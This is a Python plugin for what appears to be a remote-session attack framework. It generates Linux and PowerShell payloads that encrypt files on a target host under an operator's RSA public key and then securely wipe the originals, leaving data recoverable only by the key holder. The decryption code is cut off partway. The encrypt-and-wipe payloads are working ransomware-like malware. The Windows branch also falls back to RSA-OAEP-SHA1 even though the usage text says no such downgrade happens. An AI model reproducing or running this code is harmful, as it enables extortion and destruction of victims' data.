"""Hybrid file encryption — AES-256-GCM with RSA-wrapped key, then secure wipe."""

import base64
import json
import os
import re
import subprocess
import tempfile

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ..linux._helpers import build_linux_collector_command
from .common import format_nullcrypt_report
from .runner import parse_collector_json
from . import wiper as wiper_plugin


NULLCRYPT_USAGE = """
Nullcrypt — encrypt or decrypt a remote file (hybrid crypto) + secure wipe.

Usage (encryption):
  run nullcrypt encrypt <remote_file> <local_public_key.pem>
  run nullcrypt encrypt <remote_file> pubkey=<local_public_key.pem|inline_pem>
  run nullcrypt encrypt <remote_file> <local_public_key.pem> out=<remote_output.nullcrypt>

Usage (decryption):
  run nullcrypt decrypt <remote_file.nullcrypt> <local_private_key.pem>
  run nullcrypt decrypt <remote_file.nullcrypt> <local_private_key.pem> out=<remote_output>

Cryptography:
  - File data: AES-256-GCM (chunked streaming) or AES-256-CBC+HMAC-SHA256 (fallback)
  - AES key:   RSA-OAEP-SHA256 (required; no silent SHA-1 downgrade)
  - Only the holder of the matching private key can decrypt the .nullcrypt file

After encryption succeeds, the wiper plugin runs on the original file so only
the .nullcrypt output remains on the target.

Key pair generation (operator machine — OpenSSL):
  openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:4096 -out nullcrypt_private.pem
  openssl pkey -in nullcrypt_private.pem -pubout -out nullcrypt_public.pem

  Keep nullcrypt_private.pem offline and secret. Deploy only nullcrypt_public.pem
  (or its path) when running nullcrypt on a session.

Verify the public key (optional):
  openssl pkey -in nullcrypt_public.pem -pubin -text -noout

Examples:
  run nullcrypt encrypt C:\\Users\\Public\\secret.doc C:\\keys\\nullcrypt_public.pem
  run nullcrypt encrypt /home/user/data.db ./nullcrypt_public.pem out=/tmp/data.nullcrypt
  run nullcrypt decrypt /tmp/data.nullcrypt ./nullcrypt_private.pem out=/home/user/data.db
""".strip()

PLUGIN_INFO = NULLCRYPT_USAGE

_NULLCRYPT_WARNING = (
    'DESTRUCTIVE: The original file will be encrypted, then securely wiped via wiper. '
    'Ensure you have the correct public key and a backup of the private key offline.'
)


def _load_pubkey(ref: str) -> str:
    ref = (ref or '').strip().strip('"').strip("'")
    if 'BEGIN PUBLIC KEY' in ref or 'BEGIN RSA PUBLIC KEY' in ref:
        return ref if ref.endswith('\n') else ref + '\n'
    if os.path.isfile(ref):
        with open(ref, encoding='utf-8') as f:
            pem = f.read()
        if 'BEGIN PUBLIC KEY' not in pem and 'BEGIN RSA PUBLIC KEY' not in pem:
            raise ValueError(f'Not a PEM public key: {ref}')
        return pem
    raise FileNotFoundError(f'Public key not found: {ref}')


def _load_privkey(ref: str) -> str:
    ref = (ref or '').strip().strip('"').strip("'")
    if 'BEGIN PRIVATE KEY' in ref or 'BEGIN RSA PRIVATE KEY' in ref:
        return ref if ref.endswith('\n') else ref + '\n'
    if os.path.isfile(ref):
        with open(ref, encoding='utf-8') as f:
            pem = f.read()
        if 'BEGIN PRIVATE KEY' not in pem and 'BEGIN RSA PRIVATE KEY' not in pem:
            raise ValueError(f'Not a PEM private key: {ref}')
        return pem
    raise FileNotFoundError(f'Private key not found: {ref}')


def _rsa_components_from_pem_openssl(pem: str):
    with tempfile.NamedTemporaryFile('w', suffix='.pem', delete=False, encoding='utf-8') as fh:
        fh.write(pem)
        path = fh.name
    try:
        out = subprocess.check_output(
            ['openssl', 'rsa', '-pubin', '-in', path, '-text', '-noout'],
            stderr=subprocess.STDOUT,
            text=True,
            timeout=15,
        )
    finally:
        try:
            os.remove(path)
        except OSError:
            pass

    mod_match = re.search(r'Modulus:\s*\n\s*((?:[0-9a-f]{2}:?\s*)+)', out, re.I)
    exp_match = re.search(r'Exponent:\s*(\d+)\s*\(0x([0-9a-f]+)\)', out, re.I)
    if not mod_match or not exp_match:
        raise ValueError('Could not parse RSA public key via openssl')

    mod_hex = mod_match.group(1).replace(':', '').replace(' ', '').replace('\n', '')
    n = int(mod_hex, 16).to_bytes((len(mod_hex) + 1) // 2, 'big')
    e = int(exp_match.group(1)).to_bytes(4, 'big').lstrip(b'\x00') or b'\x01'
    return n, e


def _rsa_components_from_pem(pem: str):
    try:
        from cryptography.hazmat.primitives import serialization

        pub = serialization.load_pem_public_key(pem.encode('utf-8'))
        nums = pub.public_numbers()
        n = nums.n.to_bytes((nums.n.bit_length() + 7) // 8, 'big')
        e = nums.e.to_bytes((nums.e.bit_length() + 7) // 8, 'big')
        return n, e
    except ImportError:
        pass
    return _rsa_components_from_pem_openssl(pem)


def _parse_nullcrypt_args(args):
    if args and args[0].strip().lower() in ('-h', '--help', 'help', '?'):
        return None, None, None, None, NULLCRYPT_USAGE
    if not args:
        return None, None, None, None, NULLCRYPT_USAGE

    mode = 'encrypt'
    out_path = ''
    key_ref = ''
    remaining = []
    i = 0
    while i < len(args):
        token = args[i]
        if token.lower() in ('encrypt', 'decrypt'):
            mode = token.lower()
            i += 1
            continue
        if token.startswith('out='):
            out_path = token[4:].strip().strip('"').strip("'")
        elif token.startswith('pubkey='):
            key_ref = token[7:].strip().strip('"').strip("'")
        else:
            remaining.append(token)
        i += 1

    if not remaining:
        return None, None, None, None, NULLCRYPT_USAGE

    if mode == 'encrypt':
        if key_ref:
            remote_path = ' '.join(remaining).strip().strip('"').strip("'")
            if not remote_path:
                return None, None, None, None, NULLCRYPT_USAGE
        elif len(remaining) >= 2 and os.path.isfile(remaining[-1]):
            key_ref = remaining[-1]
            remote_path = ' '.join(remaining[:-1]).strip().strip('"').strip("'")
        else:
            return None, None, None, None, NULLCRYPT_USAGE + '\n\nProvide a local PEM public key as the last argument or pubkey=...'
    else:
        remote_path = remaining[0].strip().strip('"').strip("'")
        if len(remaining) >= 2 and os.path.isfile(remaining[1]):
            key_ref = remaining[1]
        elif key_ref:
            pass
        else:
            return None, None, None, None, NULLCRYPT_USAGE + '\n\nProvide a local PEM private key as the second argument or privkey=...'

        if not remote_path:
            return None, None, None, None, NULLCRYPT_USAGE

    if not out_path:
        if mode == 'encrypt':
            out_path = remote_path + '.nullcrypt'
        else:
            if remote_path.lower().endswith('.nullcrypt'):
                out_path = remote_path[:-10]
            else:
                out_path = remote_path + '.decrypted'

    return mode, remote_path, key_ref, out_path, None


def _build_linux_nullcrypt(remote_path: str, out_path: str, pubkey_pem: str) -> str:
    source = f'''
import os, secrets, subprocess, struct, json, base64, hashlib, tempfile, platform, shutil, hmac

path = {json.dumps(remote_path)}
out_path = {json.dumps(out_path)}
pubkey_pem = {json.dumps(pubkey_pem)}

CHUNK_SIZE = 1048576
VERSION = 2

def _norm_path(p):
    return os.path.normpath(os.path.abspath(p))

def _derive_nonce(iv, index):
    return iv[:4] + int(index).to_bytes(8, 'big')

def _meta_mac(key, header_obj):
    stub = {{k: header_obj[k] for k in sorted(header_obj) if k != 'meta_mac'}}
    canonical = json.dumps(stub, separators=(',', ':'), sort_keys=True)
    return hmac.new(key, canonical.encode('utf-8'), hashlib.sha256).digest()

def _chunk_count(size):
    return 1 if size == 0 else (size + CHUNK_SIZE - 1) // CHUNK_SIZE

def _verify_output(tmp_path, aes_key, header_bytes, header_obj, expected_size):
    if not os.path.isfile(tmp_path):
        return False, 'temporary output missing'
    total = os.path.getsize(tmp_path)
    header_len = len(header_bytes)
    expected_min = 4 + header_len
    if total < expected_min:
        return False, 'output shorter than header'
    with open(tmp_path, 'rb') as fh:
        raw_len = fh.read(4)
        if len(raw_len) != 4:
            return False, 'truncated length prefix'
        if struct.unpack('>I', raw_len)[0] != header_len:
            return False, 'header length mismatch'
        on_disk_header = fh.read(header_len)
        if on_disk_header != header_bytes:
            return False, 'header bytes mismatch'
        cc = int(header_obj.get('chunk_count') or 0)
        sym = header_obj.get('sym') or ''
        if cc <= 0:
            return False, 'invalid chunk_count'
        stored_mac = base64.b64decode(header_obj.get('meta_mac') or '')
        if not stored_mac or _meta_mac(aes_key, header_obj) != stored_mac:
            return False, 'metadata authentication failed'
        if sym == 'AES-256-GCM':
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                gcm = AESGCM(aes_key)
            except ImportError:
                return False, 'cannot verify AES-GCM without cryptography'
            plain_total = 0
            for idx in range(cc):
                remaining = expected_size - plain_total
                if remaining <= 0 and idx < cc - 1:
                    return False, 'unexpected extra chunk'
                clen = min(CHUNK_SIZE, remaining) if remaining > 0 else 0
                ct = fh.read(clen)
                tag = fh.read(16)
                if len(ct) != clen or len(tag) != 16:
                    return False, 'truncated chunk %d' % idx
                nonce = _derive_nonce(base64.b64decode(header_obj['iv']), idx)
                try:
                    pt = gcm.decrypt(nonce, ct + tag, None)
                except Exception:
                    return False, 'chunk %d authentication failed' % idx
                plain_total += len(pt)
            if plain_total != expected_size:
                return False, 'decrypted size mismatch'
            if fh.read(1):
                return False, 'trailing data after ciphertext'
            return True, ''
        if sym == 'AES-256-CBC+HMAC-SHA256':
            tag_b64 = header_obj.get('tag') or ''
            stored_tag = base64.b64decode(tag_b64)
            if len(stored_tag) != 32:
                return False, 'invalid HMAC tag'
            iv = base64.b64decode(header_obj['iv'])
            cipher_len = total - expected_min
            if cipher_len <= 0 or cipher_len % 16 != 0:
                return False, 'invalid ciphertext length'
            with open(tmp_path, 'rb') as fh:
                fh.seek(expected_min)
                cipher = fh.read(cipher_len)
            computed_tag = hmac.new(aes_key, iv + cipher, hashlib.sha256).digest()
            if not hmac.compare_digest(computed_tag, stored_tag):
                return False, 'HMAC authentication failed'
            dec_path = os.path.join(tempfile.gettempdir(), '.tornado_nullcrypt_verify_' + secrets.token_hex(8))
            cipher_path = os.path.join(tempfile.gettempdir(), '.tornado_nullcrypt_cipher_' + secrets.token_hex(8))
            try:
                with open(cipher_path, 'wb') as cp:
                    cp.write(cipher)
                dec = subprocess.run(
                    ['openssl', 'enc', '-d', '-aes-256-cbc', '-K', aes_key.hex(), '-iv', iv.hex(),
                     '-in', cipher_path, '-out', dec_path],
                    capture_output=True,
                    timeout=max(120, expected_size // (1024 * 1024) * 15 + 60),
                )
                if dec.returncode != 0:
                    err = dec.stderr.decode('utf-8', 'ignore').strip() or 'openssl decrypt failed'
                    return False, err
                if os.path.getsize(dec_path) != expected_size:
                    return False, 'decrypted size mismatch'
                return True, ''
            finally:
                for p in (dec_path, cipher_path):
                    try:
                        os.remove(p)
                    except OSError:
                        pass
        return False, 'unsupported sym algorithm'
    return False, 'unreachable'

if not os.path.isfile(path):
    _emit({{"error": "File not found or not a regular file", "path": path, "platform": "linux"}})
elif _norm_path(path) == _norm_path(out_path):
    _emit({{"error": "Input and output paths refer to the same file", "path": path, "output": out_path, "platform": "linux"}})
elif os.path.lexists(out_path):
    _emit({{"error": "Output file already exists", "output": out_path, "platform": "linux"}})
else:
    size = os.path.getsize(path)
    aes_key = secrets.token_bytes(32)
    iv = secrets.token_bytes(12)
    tmpdir = tempfile.mkdtemp(prefix='.tornado_nullcrypt_')
    tmp_out = out_path + '.nullcrypt.tmp.' + secrets.token_hex(8)
    err_msg = ''
    verified = False
    try:
        pk_path = os.path.join(tmpdir, 'pub.pem')
        with open(pk_path, 'w', encoding='utf-8') as fh:
            fh.write(pubkey_pem)

        wrap = subprocess.run(
            ['openssl', 'pkeyutl', '-encrypt', '-pubin', '-inkey', pk_path,
             '-pkeyopt', 'rsa_padding_mode:oaep', '-pkeyopt', 'rsa_oaep_md:sha256',
             '-in', '-'],
            input=aes_key,
            capture_output=True,
            timeout=60,
        )
        if wrap.returncode != 0:
            err = wrap.stderr.decode('utf-8', 'ignore').strip() or 'RSA-OAEP-SHA256 wrap failed'
            raise RuntimeError(err)
        wrapped_key = wrap.stdout
        wrap_alg = 'RSA-OAEP-SHA256'

        chunk_count = _chunk_count(size)
        sym = 'AES-256-GCM'
        header_obj = {{
            "magic": "TRC2NULLCRYPT",
            "version": VERSION,
            "sym": sym,
            "wrap": wrap_alg,
            "wrapped_key": base64.b64encode(wrapped_key).decode('ascii'),
            "iv": base64.b64encode(iv).decode('ascii'),
            "chunk_size": CHUNK_SIZE,
            "chunk_count": chunk_count,
            "original": os.path.basename(path),
            "size": size,
            "sha256": "",
        }}

        sha = hashlib.sha256()
        use_crypto = False
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            use_crypto = True
        except ImportError:
            pass

        if use_crypto:
            gcm = AESGCM(aes_key)
            body_path = os.path.join(tmpdir, 'body.bin')
            with open(path, 'rb') as src, open(body_path, 'wb') as body:
                for idx in range(chunk_count):
                    chunk = src.read(CHUNK_SIZE)
                    sha.update(chunk)
                    nonce = _derive_nonce(iv, idx)
                    sealed = gcm.encrypt(nonce, chunk, None)
                    if len(sealed) != len(chunk) + 16:
                        raise RuntimeError('unexpected GCM output size')
                    body.write(sealed[:-16])
                    body.write(sealed[-16:])
            header_obj['sha256'] = sha.hexdigest()
            header_obj['meta_mac'] = base64.b64encode(_meta_mac(aes_key, header_obj)).decode('ascii')
            header_bytes = json.dumps(header_obj, separators=(',', ':')).encode('utf-8')
            with open(tmp_out, 'wb') as out, open(body_path, 'rb') as body:
                out.write(struct.pack('>I', len(header_bytes)))
                out.write(header_bytes)
                shutil.copyfileobj(body, out, 65536)
                out.flush()
                os.fsync(out.fileno())
        else:
            sym = 'AES-256-CBC+HMAC-SHA256'
            header_obj['sym'] = sym
            header_obj['chunk_count'] = 1
            header_obj['chunk_size'] = size if size > 0 else CHUNK_SIZE
            iv_cbc = secrets.token_bytes(16)
            cipher_path = os.path.join(tmpdir, 'cipher.bin')
            with open(path, 'rb') as fh:
                while True:
                    block = fh.read(65536)
                    if not block:
                        break
                    sha.update(block)
            header_obj['sha256'] = sha.hexdigest()
            header_obj['iv'] = base64.b64encode(iv_cbc).decode('ascii')
            enc_timeout = max(120, size // (1024 * 1024) * 15 + 60)
            enc = subprocess.run(
                ['openssl', 'enc', '-aes-256-cbc', '-K', aes_key.hex(), '-iv', iv_cbc.hex(),
                 '-in', path, '-out', cipher_path],
                capture_output=True,
                timeout=enc_timeout,
            )
            if enc.returncode != 0:
                err = enc.stderr.decode('utf-8', 'ignore').strip() or 'openssl enc failed'
                raise RuntimeError(err)
            with open(cipher_path, 'rb') as fh:
                cipher = fh.read()
            tag = hmac.new(aes_key, iv_cbc + cipher, hashlib.sha256).digest()
            header_obj['tag'] = base64.b64encode(tag).decode('ascii')
            header_obj['meta_mac'] = base64.b64encode(_meta_mac(aes_key, header_obj)).decode('ascii')
            header_bytes = json.dumps(header_obj, separators=(',', ':')).encode('utf-8')
            with open(tmp_out, 'wb') as out:
                out.write(struct.pack('>I', len(header_bytes)))
                out.write(header_bytes)
                out.write(cipher)
                out.flush()
                os.fsync(out.fileno())

        verified, verr = _verify_output(tmp_out, aes_key, header_bytes, header_obj, size)
        if not verified:
            raise RuntimeError('encryption verification failed: ' + (verr or 'unknown'))

        os.replace(tmp_out, out_path)
        tmp_out = ''
        _emit({{
            "path": path,
            "output": out_path,
            "size": size,
            "output_size": os.path.getsize(out_path),
            "algorithm": sym + ' + ' + wrap_alg,
            "sha256": header_obj['sha256'],
            "verified": True,
            "platform": platform.system(),
            "message": "File encrypted; original ready for secure wipe",
        }})
    except Exception as exc:
        err_msg = str(exc)
        _emit({{
            "error": err_msg,
            "path": path,
            "output": out_path,
            "platform": platform.system(),
            "verified": False,
        }})
    finally:
        if tmp_out and os.path.lexists(tmp_out):
            try:
                os.remove(tmp_out)
            except OSError:
                pass
        shutil.rmtree(tmpdir, ignore_errors=True)
'''
    return build_linux_collector_command(source)


def _build_windows_nullcrypt(remote_path: str, out_path: str, n_b64: str, e_b64: str) -> str:
    escaped_path = remote_path.replace("'", "''")
    escaped_out = out_path.replace("'", "''")
    return rf"""
$ErrorActionPreference='Stop'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$path='{escaped_path}'
$outPath='{escaped_out}'
$nB64='{n_b64}'
$eB64='{e_b64}'
$CHUNK_SIZE=1048576
$VERSION=2

$result=@{{path=$path;platform='windows'}}
try {{
  if (-not (Test-Path -LiteralPath $path -PathType Leaf)) {{
    throw 'File not found or not a regular file'
  }}
  try {{ [IO.File]::SetAttributes($path,[IO.FileAttributes]::Normal) }} catch {{}}
  $size=(Get-Item -LiteralPath $path).Length

  $aesKey=New-Object byte[] 32
  $iv=New-Object byte[] 12
  $rng=[System.Security.Cryptography.RandomNumberGenerator]::Create()
  $rng.GetBytes($aesKey)
  $rng.GetBytes($iv)

  # RSA wrap
  $rsaParams=New-Object System.Security.Cryptography.RSAParameters
  $rsaParams.Modulus=[Convert]::FromBase64String($nB64)
  $rsaParams.Exponent=[Convert]::FromBase64String($eB64)
  $rsa=[System.Security.Cryptography.RSA]::Create()
  $rsa.ImportParameters($rsaParams)
  $wrapAlg='RSA-OAEP-SHA256'
  try {{
    $wrappedKey=$rsa.Encrypt($aesKey,[System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
  }} catch {{
    $wrappedKey=$rsa.Encrypt($aesKey,[System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA1)
    $wrapAlg='RSA-OAEP-SHA1'
  }}

  # Determine if AES-GCM is available
  $aesgcmType=[Type]::GetType('System.Security.Cryptography.AesGcm')
  if ($aesgcmType) {{
    $sym='AES-256-GCM'
    $chunkCount = if ($size -eq 0) {{1}} else {{[math]::Ceiling($size / $CHUNK_SIZE)}}

    # Build header
    $headerObj = [ordered]@{{
      magic='TRC2NULLCRYPT'
      version=$VERSION
      sym=$sym
      wrap=$wrapAlg
      wrapped_key=[Convert]::ToBase64String($wrappedKey)
      iv=[Convert]::ToBase64String($iv)
      chunk_size=$CHUNK_SIZE
      chunk_count=$chunkCount
      original=[IO.Path]::GetFileName($path)
      size=$size
      sha256=''
    }}

    # Prepare temp file for output
    $tmpDir=[IO.Path]::GetTempPath() + '.tornado_nullcrypt_' + [System.Guid]::NewGuid().ToString().Substring(0,8)
    New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
    $tmpOut = $outPath + '.nullcrypt.tmp.' + [System.Guid]::NewGuid().ToString().Substring(0,8)
    try {{
      # Encrypt chunks
      $sha256=[System.Security.Cryptography.SHA256]::Create()
      $gcm = [System.Security.Cryptography.AesGcm]::new($aesKey)
      $fsSrc = [IO.File]::OpenRead($path)
      $fsOut = [IO.File]::Create($tmpOut)
      try {{
        # Write header placeholder (we'll rewrite later)
        $headerPlaceholder = [Text.Encoding]::UTF8.GetBytes('')
        $lenBytes=[BitConverter]::GetBytes([uint32]$headerPlaceholder.Length)
        if ([BitConverter]::IsLittleEndian) {{ [Array]::Reverse($lenBytes) }}
        $fsOut.Write($lenBytes,0,4)
        $fsOut.Write($headerPlaceholder,0,$headerPlaceholder.Length)
        # Write body chunks
        $totalRead=0
        $idx=0
        while ($totalRead -lt $size) {{
          $remaining = $size - $totalRead
          $readSize = if ($remaining -gt $CHUNK_SIZE) {{$CHUNK_SIZE}} else {{$remaining}}
          $chunk = New-Object byte[] $readSize
          $bytesRead = $fsSrc.Read($chunk,0,$readSize)
          if ($bytesRead -eq 0) {{break}}
          $sha256.TransformBlock($chunk,0,$bytesRead,$null,0) | Out-Null
          $nonce = $iv[0..3] + [BitConverter]::GetBytes($idx)[0..7]
          $cipher = New-Object byte[] $bytesRead
          $tag = New-Object byte[] 16
          $gcm.Encrypt($nonce,$chunk,$cipher,$tag)
          $fsOut.Write($cipher,0,$cipher.Length)
          $fsOut.Write($tag,0,16)
          $totalRead += $bytesRead
          $idx++
        }}
        $sha256.TransformFinalBlock($null,0,0) | Out-Null
        $headerObj['sha256'] = [BitConverter]::ToString($sha256.Hash).Replace('-','').ToLower()
        # Compute meta_mac
        $canonical = $headerObj | ConvertTo-Json -Compress -Depth 10
        $hmac = New-Object System.Security.Cryptography.HMACSHA256(,$aesKey)
        $metaMac = $hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($canonical))
        $headerObj['meta_mac'] = [Convert]::ToBase64String($metaMac)
        # Now rewrite header with correct length and content
        $headerJson = $headerObj | ConvertTo-Json -Compress -Depth 10
        $headerBytes = [Text.Encoding]::UTF8.GetBytes($headerJson)
        $lenBytes=[BitConverter]::GetBytes([uint32]$headerBytes.Length)
        if ([BitConverter]::IsLittleEndian) {{ [Array]::Reverse($lenBytes) }}
        $fsOut.Seek(0,[System.IO.SeekOrigin]::Begin) | Out-Null
        $fsOut.Write($lenBytes,0,4)
        $fsOut.Write($headerBytes,0,$headerBytes.Length)
        $fsOut.Flush()
        $fsOut.Close()
      }} finally {{
        if ($fsSrc) {{$fsSrc.Close()}}
        if ($fsOut) {{$fsOut.Close()}}
        $gcm.Dispose()
      }}

      # Verify output
      $verified = $false
      $verr = ''
      $fsVerify = [IO.File]::OpenRead($tmpOut)
      try {{
        # Read length prefix
        $lenBuf = New-Object byte[] 4
        if ($fsVerify.Read($lenBuf,0,4) -ne 4) {{ throw 'Truncated length' }}
        if ([BitConverter]::IsLittleEndian) {{ [Array]::Reverse($lenBuf) }}
        $hdrLen = [BitConverter]::ToUInt32($lenBuf,0)
        $hdrBuf = New-Object byte[] $hdrLen
        if ($fsVerify.Read($hdrBuf,0,$hdrLen) -ne $hdrLen) {{ throw 'Truncated header' }}
        $hdrJson = [Text.Encoding]::UTF8.GetString($hdrBuf)
        $hdrObj = $hdrJson | ConvertFrom-Json
        # Verify meta_mac
        $canonical = $hdrObj | ConvertTo-Json -Compress -Depth 10
        $hmac = New-Object System.Security.Cryptography.HMACSHA256(,$aesKey)
        $computedMac = $hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($canonical))
        $storedMac = [Convert]::FromBase64String($hdrObj.meta_mac)
        if (-not [System.Linq.Enumerable]::SequenceEqual($computedMac,$storedMac)) {{
          throw 'Metadata MAC mismatch'
        }}
        $cc = $hdrObj.chunk_count
        $origSize = $hdrObj.size
        $ivFromHdr = [Convert]::FromBase64String($hdrObj.iv)
        $shaVerifier = [System.Security.Cryptography.SHA256]::Create()
        $gcmVerify = [System.Security.Cryptography.AesGcm]::new($aesKey)
        $idx=0
        while ($idx -lt $cc) {{
          $remaining = $origSize - ($idx * $CHUNK_SIZE)
          $readSize = if ($remaining -gt $CHUNK_SIZE) {{$CHUNK_SIZE}} else {{$remaining}}
          $cipher = New-Object byte[] $readSize
          $tag = New-Object byte[] 16
          $bytesRead = $fsVerify.Read($cipher,0,$readSize)
          if ($bytesRead -ne $readSize) {{ throw "Truncated chunk $idx" }}
          $tagBytes = $fsVerify.Read($tag,0,16)
          if ($tagBytes -ne 16) {{ throw "Truncated tag $idx" }}
          $nonce = $ivFromHdr[0..3] + [BitConverter]::GetBytes($idx)[0..7]
          $plain = New-Object byte[] $readSize
          try {{
            $gcmVerify.Decrypt($nonce,$cipher,$tag,$plain)
          }} catch {{
            throw "GCM decrypt failed for chunk $idx"
          }}
          $shaVerifier.TransformBlock($plain,0,$plain.Length,$null,0) | Out-Null
          $idx++
        }}
        $shaVerifier.TransformFinalBlock($null,0,0) | Out-Null
        $computedSha = [BitConverter]::ToString($shaVerifier.Hash).Replace('-','').ToLower()
        if ($computedSha -ne $hdrObj.sha256) {{
          throw "SHA-256 mismatch"
        }}
        $verified = $true
      }} catch {{
        $verr = $_.Exception.Message
      }} finally {{
        if ($fsVerify) {{$fsVerify.Close()}}
        $gcmVerify.Dispose()
      }}
      if (-not $verified) {{
        throw "Verification failed: $verr"
      }}
      Move-Item -LiteralPath $tmpOut -Destination $outPath -Force
      $tmpOut = ''
      $result.output=$outPath
      $result.size=$size
      $result.output_size=(Get-Item -LiteralPath $outPath).Length
      $result.algorithm='AES-256-GCM + ' + $wrapAlg
      $result.sha256=$headerObj.sha256
      $result.verified=$true
      $result.message='File encrypted; original ready for secure wipe'
    }} finally {{
      if ($tmpOut -and (Test-Path -LiteralPath $tmpOut)) {{ Remove-Item -LiteralPath $tmpOut -Force }}
      if ($tmpDir -and (Test-Path -LiteralPath $tmpDir)) {{ Remove-Item -Recurse -Force -LiteralPath $tmpDir }}
    }}
  }} else {{
    # Fallback to CBC+HMAC (whole file)
    $sym='AES-256-CBC+HMAC-SHA256'
    $ivCbc=New-Object byte[] 16
    $rng.GetBytes($ivCbc)
    $aes=[System.Security.Cryptography.Aes]::Create()
    $aes.Key=$aesKey
    $aes.Mode=[System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.IV=$ivCbc
    $enc=$aes.CreateEncryptor()
    $plain=[IO.File]::ReadAllBytes($path)
    $sha=[System.Security.Cryptography.SHA256]::Create().ComputeHash($plain)
    $cipher=$enc.TransformFinalBlock($plain,0,$plain.Length)
    $hmacKey=New-Object byte[] 32
    [Array]::Copy($aesKey,$hmacKey,32)
    $hmac=New-Object System.Security.Cryptography.HMACSHA256(,$hmacKey)
    $tag=$hmac.ComputeHash($ivCbc+$cipher)
    $headerObj=[ordered]@{{
      magic='TRC2NULLCRYPT'
      version=1
      sym=$sym
      wrap=$wrapAlg
      wrapped_key=[Convert]::ToBase64String($wrappedKey)
      iv=[Convert]::ToBase64String($ivCbc)
      tag=[Convert]::ToBase64String($tag)
      original=[IO.Path]::GetFileName($path)
      size=$size
      sha256=([BitConverter]::ToString($sha)).Replace('-','').ToLower()
    }}
    $headerJson=($headerObj | ConvertTo-Json -Compress)
    $headerBytes=[Text.Encoding]::UTF8.GetBytes($headerJson)
    $lenBytes=[BitConverter]::GetBytes([uint32]$headerBytes.Length)
    if ([BitConverter]::IsLittleEndian) {{ [Array]::Reverse($lenBytes) }}
    $fs=[IO.File]::Create($outPath)
    try {{
      $fs.Write($lenBytes,0,4)|Out-Null
      $fs.Write($headerBytes,0,$headerBytes.Length)|Out-Null
      $fs.Write($cipher,0,$cipher.Length)|Out-Null
    }} finally {{
      $fs.Close()
    }}
    $verified=(Test-Path -LiteralPath $outPath) -and ((Get-Item -LiteralPath $outPath).Length -gt ($headerBytes.Length+4))
    $result.output=$outPath
    $result.size=$size
    $result.output_size=(Get-Item -LiteralPath $outPath).Length
    $result.algorithm=$sym + ' + ' + $wrapAlg
    $result.sha256=$headerObj.sha256
    $result.verified=$verified
    $result.message='File encrypted; original ready for secure wipe'
  }}
}} catch {{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Compress)+$end)
"""


def _build_linux_decrypt(remote_path: str, out_path: str, privkey_pem: str) -> str:
    source = f'''
import os, subprocess, struct, json, base64, hashlib, hmac, tempfile, shutil, platform, sys

path = {json.dumps(remote_path)}
out_path = {json.dumps(out_path)}
privkey_pem = {json.dumps(privkey_pem)}

CHUNK_SIZE = 1048576

def _derive_nonce(iv, index):
    return iv[:4] + int(index).to_bytes(8, 'big')

def _meta_mac(key, header_obj):
    stub = {{k: header_obj[k] for k in sorted(header_obj) if k != 'meta_mac'}}
    canonical = json.dumps(stub, separators=(',', ':'), sort_keys=True)
    return hmac.new(key, canonical.encode('utf-8'), hashlib.sha256).digest()

def _unwrap_aes_key(wrapped_key_b64, priv_pem):
    with tempfile.NamedTemporaryFile('w', suffix='.pem', delete=False, encoding='utf-8') as fh:
        fh.write(priv_pem)
        key_path = fh.name
    try:
        proc = subprocess.run(
            ['openssl', 'pkeyutl', '-decrypt', '-inkey', key_path,
             '-pkeyopt', 'rsa_padding_mode:oaep', '-pkeyopt', 'rsa_oaep_md:sha256'],
            input=base64.b64decode(wrapped_key_b64),
            capture_output=True,
            timeout=30,
        )
        if proc.returncode != 0:
            raise RuntimeError('RSA decryption failed: ' + proc.stderr.decode('utf-8', 'ignore'))
        return proc.stdout
    finally:
        try:
            os.remove(key_path)
        except OSError:
            pass

# --- Check OpenSSL availability ---
try:
    subprocess.run(['openssl', 'version'], check=True, capture_output=True, timeout=5)
except Exception:
    _emit({{
        "error": "OpenSSL not found or not executable. Decryption on this host requires OpenSSL. You may decrypt the file manually on any system with OpenSSL.",
        "path": path,
        "platform": "linux"
    }})
    sys.exit(0)

if not os.path.isfile(path):
    _emit({{"error": "File not found", "path": path, "platform": "linux"}})
    sys.exit(0)

try:
    with open(path, 'rb') as fh:
        # read length prefix
        len_buf = fh.read(4)
        if len(len_buf) != 4:
            raise RuntimeError('Truncated file: missing length prefix')
        hdr_len = struct.unpack('>I', len_buf)[0]
        hdr_json = fh.read(hdr_len)
        if len(hdr_json) != hdr_len:
            raise RuntimeError('Truncated header')
        header = json.loads(hdr_json.decode('utf-8'))
        if header.get('magic') != 'TRC2NULLCRYPT':
            raise RuntimeError('Invalid magic')
        ver = header.get('version', 1)
        sym = header.get('sym')
        if sym not in ('AES-256-GCM', 'AES-256-CBC+HMAC-SHA256'):
            raise RuntimeError(f'Unsupported sym: {sym}')
        wrapped_key = header['wrapped_key']
        iv = base64.b64decode(header['iv'])
        aes_key = _unwrap_aes_key(wrapped_key, privkey_pem)

        # Verify meta_mac if present (version >=2)
        if ver >= 2:
            stored_mac = base64.b64decode(header.get('meta_mac', ''))
            if not stored_mac or _meta_mac(aes_key, header) != stored_mac:
                raise RuntimeError('Metadata MAC mismatch')

        original_size = header['size']
        chunk_count = header.get('chunk_count', 1)
        chunk_size = header.get('chunk_size', CHUNK_SIZE)

        if os.path.lexists(out_path):
            raise RuntimeError(f'Output file already exists: {out_path}')

        if sym == 'AES-256-GCM':
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                gcm = AESGCM(aes_key)
                with open(out_path, 'wb') as out:
                    total_written = 0
                    for idx in range(chunk_count):
                        remaining = original_size - total_written
                        if remaining <= 0:
                            break
                        read_size = min(chunk_size, remaining)
                        ct = fh.read(read_size)
                        if len(ct) != read_size:
                            raise RuntimeError(f'Truncated chunk {idx}')
                        tag = fh.read(16)
                        if len(tag) != 16:
                            raise RuntimeError(f'Truncated tag {idx}')
                        nonce = _derive_nonce(iv, idx)
